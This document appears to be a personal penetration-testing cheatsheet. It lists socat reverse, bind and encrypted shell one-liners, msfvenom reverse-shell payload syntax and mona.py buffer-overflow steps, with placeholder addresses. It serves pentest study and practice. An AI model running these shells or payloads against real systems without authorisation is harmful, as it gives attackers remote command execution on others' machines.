# Tools and commands cheatsheet

Set of notes related to pentesting tools.

## Crackmapexec

```bash
# base template for commands
cme <service> <target_IP> -d <domain> -u '<user>' -p '<pass>' --<action>
```

## Socat

### Fully interactive TTY reverse shell

* on attack box: ```socat file:`tty`,raw,echo=0 tcp-listen:4444```
* on target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ip>:4444`

### Reverse shells

* basic reverse shell listener in socat: `socat TCP-L:<port> -`
* connecting back on windows: `socat TCP:<local-ip>:<local-port> EXEC:powershell.exe,pipes`
* connecting back on linux: `socat TCP:<local-ip>:<local-port> EXEC:"bash -li"`

### Fully stable reverse shell on linux

* set up the following listener: ```socat TCP-L:<port> FILE:`tty`,raw,echo=0```
* connect to the listener as you would with netcat or rlwrap
* run the following command to get a stable shell: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Bind shells

* on a linux target: `socat TCP-L:<port> EXEC:"bash -li"`
* on a windows target: `socat TCP-L:<port> EXEC:powershell.exe,pipes`
* connecting to the listener on the attack box: `socat TCP:<target-ip>:<target-port> -`

### Encrypted shells

* generate a certificate on the attack box: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
* merge the two created files: `cat shell.key shell.crt > shell.pem`
* use the certificate on both the attack box and the target

### Reverse encrypted shell

* set up the socat listener: `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`
* connect back to the listener: `socat OPENSSL:<local-ip>:<local-port>,verify=0 EXEC:/bin/bash`

### Bind encrypted shell

* set up the listener on the target: `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
* connect from the attack box: `socat OPENSSL:<target-ip>:<target-port>,verify=0 -`

## Msfvenom

### Example syntax

* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-ip> LPORT=<listen-port>`

### Meterpreter payload naming convention

* general naming convention is `<OS>/<arch>/<payload>`
* for instance `linux/x86/shell_reverse_tcp`
* however, windows 32bit targets have no specified arch, like so: `windows/shell_reverse_tcp`
* staged payloads are denoted by a slash: `windows/x64/meterpreter/reverse_tcp`
* stageless payloads are denoted by an underscore: `linux/x86/meterpreter_reverse_tcp`

### Listing payloads

* `msfvenom --list payloads`
* grep the output for specific results, like `msfvenom --list payloads | grep "linux/x86/meterpreter"`

## mona.py

### Main commands for BOFs with immunity debugger

* set a working folder at C:\mona\<app-name>: `!mona config -set workingfolder c:\mona\%p`
* calculate exact offset with distance from metasploit's pattern_create: `!mona findmsp -distance <length from pattern_create.rb>`
* generate badchars, excluding \x00 which is always bad: `!mona bytearray -b "\x00"`
* compare badchars with specified address, usually the ESP register: `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
* finding a jump point for your exploit without the badchars: `!mona jmp -r <register> -cpb "<badchars found>"`
